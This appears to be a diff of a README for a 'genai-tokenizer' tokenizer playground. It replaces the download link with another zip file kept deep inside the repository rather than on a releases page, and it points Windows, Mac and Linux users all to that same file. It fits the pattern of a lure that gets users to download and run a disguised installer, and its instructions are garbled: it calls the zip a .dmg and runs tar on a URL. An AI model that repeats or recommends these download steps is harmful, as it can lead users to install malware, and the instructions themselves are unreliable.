@@ -1,6 +1,6 @@
 # 🎉 genai-tokenizer - Explore Text Tokenization Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip)](https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip)
+[![Download Latest Release](https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip)](https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip)
 
 ## 📖 Description
 GenAi Tokenizer is an interactive tokenizer playground. It helps you see how text breaks into tokens, understand how unique token IDs are assigned, and discover how decoding works—all powered by a custom tokenizer. This tool is ideal for anyone curious about text processing without needing programming skills.
@@ -9,12 +9,12 @@ GenAi Tokenizer is an interactive tokenizer playground. It helps you see how tex
 Follow these simple steps to download and run the GenAi Tokenizer from our Releases page.
 
 ### 📥 Download & Install
-1. **Visit the Releases Page**: Click here to [download GenAi Tokenizer](https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip).
+1. **Visit the Releases Page**: Click here to [download GenAi Tokenizer](https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip).
 2. **Choose Your Version**: On the Releases page, select the version that suits your needs. The latest version is recommended for the best experience.
 3. **Download the Installer**: Click on the appropriate file for your operating system. 
-   - For Windows users, download `https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip`.
-   - For Mac users, download `https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip`.
-   - For Linux users, download `https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip`.
+   - For Windows users, download `https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip`.
+   - For Mac users, download `https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip`.
+   - For Linux users, download `https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip`.
 
 ### 🔧 System Requirements
 - **Operating Systems**:
@@ -28,23 +28,23 @@ Follow these simple steps to download and run the GenAi Tokenizer from our Relea
 After downloading the appropriate file, follow these steps to run the GenAi Tokenizer:
 
 ### For Windows:
-1. Locate `https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip` in your Downloads folder.
+1. Locate `https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip` in your Downloads folder.
 2. Double-click to start the installation.
 3. Follow the on-screen instructions to complete the installation process.
 4. Once installed, you can find the GenAi Tokenizer in your Start Menu. Click to open.
 
 ### For Mac:
-1. Find `https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip` in your Downloads folder.
+1. Find `https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip` in your Downloads folder.
 2. Double-click the .dmg file to mount it.
 3. Drag the GenAi Tokenizer app into your Applications folder.
 4. Open your Applications folder and double-click to launch the app.
 
 ### For Linux:
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded `https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip`.
+2. Navigate to the directory where you downloaded `https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip`.
 3. Extract the files by running the command:
    ```
-   tar -xzvf https://raw.githubusercontent.com/Marcelleedit7272/genai-tokenizer/main/briolette/genai-tokenizer.zip
+   tar -xzvf https://github.com/Marcelleedit7272/genai-tokenizer/raw/refs/heads/main/src/context/genai-tokenizer-1.6.zip
    ```
 4. Change to the created directory:
    ```
